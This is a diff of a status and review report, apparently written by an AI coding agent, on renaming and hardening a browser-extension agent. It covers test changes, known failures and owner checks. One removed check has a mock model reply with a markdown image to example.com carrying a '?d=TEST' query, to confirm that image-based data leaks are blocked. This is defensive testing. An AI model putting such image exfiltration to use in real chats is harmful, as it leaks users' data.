+  29 → 1 (the file name `SKILL.md`), `route-probe-panel.tsx` 17 → 0,
+  `preflight-panel.tsx` 10 → 0, `recent-requests.tsx` 1 → 0.
+- **Parity test** `packages/ui/src/i18n/locales.test.ts`: the same keys,
+  non-empty values and the same `{{placeholders}}` in en and zh.
+  Translation keys are now typed from `en.json` instead of a hand-kept union.
+- **Behaviour test:** the DOM Health card in Chinese shows "尚未检查" and a
+  "检查 DOM 健康度" button. Before: "Unable to find an element with the
+  text: 尚未检查". After: passes.
+- **Bug fixed on the way:** without an `I18nProvider`, `t()` dropped its
+  parameters, so `{{x}}` showed literally.
+- **Left in English, by scope:** the Preflight checks' own labels and fixes
+  (`services/preflight.ts`), `validateHostUrl` errors and raw provider error
+  text. The other 277 strings are elsewhere and the ratchet keeps them from
+  growing.
+
+### R9. Human-only items: prepared
+
+`docs/development/real-tenant-validation.md` has the Infor LN re-run with
+0.1.0: build, settings, screens, each of the four rule changes with where to
+see it (bundle field, or the DOM Health card where the bundle doesn't carry
+it), and a results table. `docs/release/SMOKE_TEST.md` says where results go
+and to run it for both the unpacked and the Web Store install. Not run.
+
+Only people can do these:
+
+1. The Infor LN real-tenant re-run.
+2. The manual smoke matrix on Chrome and Edge stable.
+3. The Chrome Web Store submission (unlisted, per the D1 default), including
+   the remote-code answer and the data-use form.
+4. Turning on GitHub secret scanning and push protection.
+5. The Apty Client and Studio teams allow-listing the final IDs (both).
+6. Supplying the icon artwork (D6) and checking the LGPL packages.
 
 ## Not done, or partial
 
-- **Phase 2 (R1–R9) and Phase 3:** not started, waiting for "approved" and then "continue".
-- **D1–D7:** see above. D3, D4 and D7 are provisional.
-- **Real-provider, real-tenant and Web Store checks:** not run.
-- **The prompt's environment:** `/opt/pw-browsers/chromium` is absent here, so Chrome for Testing 145 from the puppeteer cache was used instead.
-- **TruffleHog** ran from Homebrew, not Docker, because the Docker daemon was not running.
+- **R6 icons:** wait for your artwork (D6). Everything else in R6 is done.
+- **R9:** prepared only; the real-tenant re-run, the smoke matrix and the
+  store submission need people.
+- **R1 follow-ups:** `@openai/agents` 0.7 → 0.20; the knip findings (15
+  unused files, 71 unused exports) outside the Facts list.
+- **R8:** 277 hard-coded strings remain outside the listed files; the
+  ratchet stops them growing.
+- **Phase 3:** next.
 
 ## Conflicts between the prompt and the repo
 
-1. **Phase A was not on `origin/main`.** Rule 0 says to stop, and I did. You then said "go ahead", so the branch starts at the Phase A bundle's head (`5fe5227`, a fast-forward of `origin/main`) instead of `origin/main`. The checkpoint bundle carries those 8 commits too.
-2. **Existing tests changed** because they asserted behaviour this prompt removes. In each case only the assertion that encoded the removed behaviour changed; everything else was kept.
-   - `devtools.test.ts` "a remembered approval lets the next call … run without a prompt" is now "never offers to remember, and asks again".
-   - `agent.e2e` "remembers 'Allow on this site' for that tool only…" (console) is now "never remembers run_console_command…".
-   - `message-router.test.ts` "re-broadcasts and stores a captured click" is now "…without storing it".
-   - `ws-mcp-server.test.ts` "sends the token only as a subprotocol…" is now "never sends the token…", and the reconnect test's protocol list changed the same way.
-   - `daemon-server.test.ts`: the two dangerous-tool tests use `computer`, because `run_console_command` is no longer published.
-3. **Setup-only changes, with assertions unchanged:**
-   - `tab.test.ts`: a bound tab was added.
-   - `core-tools.e2e` "finds and clicks an element, then reads the page": runs in Standard, because Strict now withholds the title it reads.
-   - `stored-data-panel.test.tsx`, `skill.test.ts`, `dom-health.test.ts`: mocks for new modules.
-   - `approval-grants-panel.test.tsx`: grants gained a `requester`.
-   - `ws-mcp-server.test.ts`: helpers do the handshake and sign calls, and the 60 s timeout test waits for the tool to start.
-   - `page-hooks-registration.test.ts`: a failing-read flag.
-   - `frames.e2e` "captures a clicked element…" (2 tests): the helper listens for the broadcast `capture-click-event` instead of reading `aipex_last_capture_event`, which S3 removes as `S3.md` directs. Red on the new build, green on the old build before and after the change.
-   - `dom-health-apps.e2e` "click-only application…" and "LN portal URL…": the helper clicks "Allow once" on the application-deep prompt S5 adds. Both timed out waiting on the new build. Afterwards: 15/15 on the new build, and 15/15 for the original test on the old build.
-4. **Facts that differ from the code:**
-   - S2: `store` is omitted rather than `true`.
-   - S6: the daemon keeps the token-subprotocol path for its own clients, which is safe because only holders of the token use it, and an old extension can still connect to a new daemon. A new extension can't connect to an old daemon.
-5. **Commits:**
-   - `recording.ts`'s deletion landed in `0743ff9` (the S2 type fix) instead of the S3 commit, because it was already staged.
-   - The S4 commit's first version picked up your untracked `browser-extension-wp1.zip`. I amended it out before anything else; the file is untouched on disk and now listed in `.git/info/exclude`.
+1. **Facts that differ:** `hooks/use-storage.ts` is not dead (imported by
+   `automation-mode-toolbar.tsx` and `browser-agent-config.ts`), so R1 kept it.
+   `utils/wait-helper.ts` is at `tools/tools/utils/wait-helper.ts`.
+2. **The branding check could not fail** (its `"AIPex"` entry, compared
+   case-insensitively, allowed every line). Rewritten in R2.
+3. **Existing tests changed, with the reason:**
+   - Storage key names in test setups (`aipex_settings` → `apty_settings`,
+     `aipex_theme` → `apty_theme`; 11 files, unit and e2e). The asserted
+     values are unchanged; where an assertion names the key passed to
+     `save()`, only the key changed.
+   - Page-visible names in tests (`data-aipex-*`, `aipex-capture-highlight`
+     and the like; 9 files): the R2 rename, same assertions.
+   - `dom-health-apps.e2e` overlay test expects the matcher `id:apty-agent-`
+     instead of `id:aipex-`: the Agent's own UI is still left out, under its
+     new id prefix.
+   - `element-capture.test.ts`: the fixture's own-class `aipex-x` became
+     `apty-agent-x`.
+   - `apty-client.e2e`: reads the S7 per-context evidence keys
+     (`apty_evidence_store:<context>`); same assertion. Hidden until now by
+     the harness ID bug.
+   - `stored-data.e2e`: reads `apty-sessions`.
+   - `redaction-mode.test.ts`: an unrelated-key fixture renamed.
+   - `lifecycle.test.ts` (my R3 test): the settings key by constant.
+   - `agent.e2e` A1: waits 1.5 s for the previous test's favicon request
+     before clearing the list.
+4. **Test harness:** `tempDir` returns the real path (macOS), and
+   `launchBrowser` takes `extraArgs` (for the screenshot window size).
+5. **Rule slip:** while the e2e suite ran I once ran
+   `check-extension-id.test.mjs` (4 tiny script tests). That suite run passed
+   120/120.
+6. **R7 regression caught by the dry run:** the new Copy button's label
+   matched `getByLabel("Extension ID")`; renamed to "Copy this Agent's ID".
 
 ## Observed, not changed
 
-- Streamdown's own harden step shows every `data:` image in markdown as "[Image blocked: …]", before and after this work. Inline `[[screenshot:N]]` placeholders resolve to `data:` URLs, so they show as text in chat; tool screenshots still render.
-- Strict keeps URL paths (`applyUrlPolicy`), so a record number in a path is sent. PRIVACY.md now says so.
-- An unbalanced object or array under a sensitive key in truncated JSON is still left as it is. The prompt allows only the documented string fix.
-- `run_application_dom_health_audit` in `application-safe` mode still navigates without asking. The prompt asked only for the clicking mode.
-- Orphan agent sessions (a panel closed without "New chat", with no saved conversation) are removed only by the Settings purge.
-- Two existing e2e tests fail independently of this work:
-  - `agent.e2e` "audits DOM Health on a tab opened before the extension restarted": "Service worker did not start" on the base build too.
-  - "an 'Allow on this site' for click does not cover create_new_tab…" is flaky: the attacker server sometimes logs a `/favicon.ico` from the tab an earlier test legitimately opened. It also fails on the base build.
-- In this environment the fake Apty Client and Studio extensions never receive the Agent's external messages, so 9 Client/Studio/preflight e2e tests fail on the base build and on this branch alike. I did not investigate further; it looks environmental (Chrome for Testing 145 rather than the expected Chromium).
-- The a11y e2e "side panel, a chat with a tool result…" fails on the base build too: it waits for a "View full response" button that never appears.
-- Plugin errors in `aipex.ts` are still logged with the error object.
+- When the model calls a tool that wasn't offered for the message (tools
+  are offered by relevance), the chat hangs with no error and no reply.
+  Found while writing the R2 e2e ("find the deploy button" offers no UI
+  tools). Worth a fix: answer such a call with an error the model can read.
+- The conversation, screenshot and skills IndexedDB names still say aipex
+  (user data; not in R2's scope).
+- Four production packages are LGPL-3.0-or-later (see R4).
+- `settings/index.tsx` still has six inline `language === "zh"` strings
+  outside R8's list.
+- Phase 1's observations still stand (`git show c2ac898:REVIEW.md`).
 
 ## Five-minute owner test, per work package
 
-Build: `npm run build`, then load `apps/browser-extension/dist` unpacked in Chrome.
+Build: `npm run build`, then load `apps/browser-extension/dist` unpacked.
 
-- **S1:** set a custom provider pointing at any OpenAI-compatible mock that replies `![x](https://example.com/x.png?d=TEST)`. In DevTools for the side panel, Network shows no request to example.com, and the chat shows `[x]`.
-- **S2:** with an OpenAI key, send one message with DevTools open on the side panel. The request body to `api.openai.com/v1/responses` has `"store": false`.
-- **S3:** chat once. Then Options → General → Stored data → Delete everything. In DevTools → Application → IndexedDB, `aipex-sessions` → `sessions` is empty.
-- **S4:** with Strict on (the default), open `https://example.com/?mrn=123&dob=1961-01-01` and ask the agent "list my open tabs". In DevTools for the side panel, the request body sent to the provider shows `https://example.com` for that tab, with no title, no `mrn` and no `dob`.
-- **S5:** on any page, ask the agent to run `document.title` in the console. The prompt has no "Allow on this site", and the next run asks again.
-- **S6:** start `nc -l 9223`, set the MCP URL to `ws://127.0.0.1:9223/extension` and paste a token, then click Connect. The upgrade request `nc` prints has `Sec-WebSocket-Protocol: apty-mcp.v1, apty-auth.hmac-v1` and no token, and Connect fails. With the real daemon (`node apps/mcp-bridge/dist/daemon.js`) and its token, Connect succeeds.
-- **S7:** go offline (DevTools → Network → Offline) and send a message. The chat says you appear to be offline.
+- **R1:** `pnpm audit --prod` prints "No known vulnerabilities found";
+  `pnpm why @openai/agents-core -r` finds one version.
+- **R2:** load the Checkpoint 1 build, save a setting and chat once; load
+  this build over it (same folder, Reload). In DevTools → Application,
+  `chrome.storage.local` has `apty_settings` and no `aipex_*` key, and
+  IndexedDB has `apty-sessions` and no `aipex-sessions`. On any page after
+  a chat, Elements shows `data-apty-nodeid` and no `aipex`.
+- **R3:** `apty_settings` now has `settingsVersion: 1`.
+- **R4:** the build folder has `LICENSE`, `THIRD_PARTY_NOTICES.txt` and
+  `assets/Inter-OFL.txt`; delete one and `npm run check:dist-licences` fails.
+- **R5:** `tooling/scripts/release-dry-run.sh` ends with "Packages:".
+- **R6:** read `docs/store/WEB_STORE_LISTING.md` and the five screenshots in
+  `docs/store/screenshots/`.
+- **R7:** Settings → Apty Integration → Apty Client → Copy puts the running
+  ID on the clipboard; `unzip -p apty-agent-v0.1.0-webstore.zip manifest.json | grep key` prints nothing.
+- **R8:** Settings → General → Language → 中文, then open the side panel:
+  the DOM Health card is in Chinese.
+- **R9:** read the LN re-run section in
+  `docs/development/real-tenant-validation.md`.
 
 ## After you write "approved"
 
 I will give the exact commands to fetch and verify the bundle, merge it
-with `--ff-only`, push, and roll back with
-`git revert <first>..<last>`. I will not push anything myself.
+with `--ff-only`, push, and roll back with `git revert`. I will not push
+anything myself.
